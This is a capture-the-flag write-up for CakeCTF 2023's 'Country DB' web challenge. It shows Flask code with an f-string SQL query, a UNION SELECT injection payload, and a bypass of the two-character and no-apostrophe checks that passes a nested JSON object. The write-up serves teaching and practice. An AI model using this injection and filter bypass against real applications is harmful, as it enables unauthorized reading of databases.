Challenge name: Country DB

Category: Web

Solves: 246

### Given information

> Do you know which country code 'CA' and 'KE' are for?

> Search country codes [here](http://countrydb.2023.cakectf.com:8020/)!

### Solution

This challenge would take a two letter country code as input and return it's corresponding country name if it was present in the SQL database.

```
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

# ...

@app.route("/api/search", methods=["POST"])
def api_search():
    req = flask.request.get_json()
    if "code" not in req:
        flask.abort(400, "Empty country code")

    code = req["code"]
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {"name": name}

if __name__ == "__main__":
    app.run(debug=True)
```

The SQL query used to fetch the country name uses Python's f-string syntax to substitute the user given input `code`: `f"SELECT name FROM country WHERE code=UPPER('{code}')"`. Hence this web app is vulnerable to SQLi. From [`init_db.py`](challenge_files/init_db.py) we learn that the flag is stored in the `flag` column of the `flag` table and hence the required query to obtain the flag is:

```
') UNION SELECT flag FROM flag--"}
```

---

But we have two WAFs to cross:

-   Length of the input must equal two
-   Input must not contain an apostrophe (`'`)

WAFs validation statement: `if len(code) != 2 or "'" in code:`

After trying multiple (failed) approaches such as:

-   https://github.com/sqlmapproject/sqlmap/blob/master/tamper/apostrophemask.py
-   prefixing `\\x27`, i.e. `'` in hex
-   compressing the payload into two characters (I know!)

We look closer at the code snippet that initially parses the user input and realize that it's direct JSON input.

```
req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

code = req['code']
```

This means that we can pass a nested JSON object as a string to the `code` key. This will then get converted to a Python dictionary allowing us to bypass both the WAFs.

Hence the final payload becomes:

```
req = {"code": {"') UNION SELECT flag FROM flag--": "lorem", "ipsum": "dolor"}}

code = req["code"]

print(len(code) == 2) # True

print("'" in code) # False

print(f"SELECT name FROM country WHERE code=UPPER('{code}')")
# SELECT name FROM country WHERE code=UPPER('{"') UNION SELECT flag FROM flag--": 'lorem', 'ipsum': 'dolor'}')
```
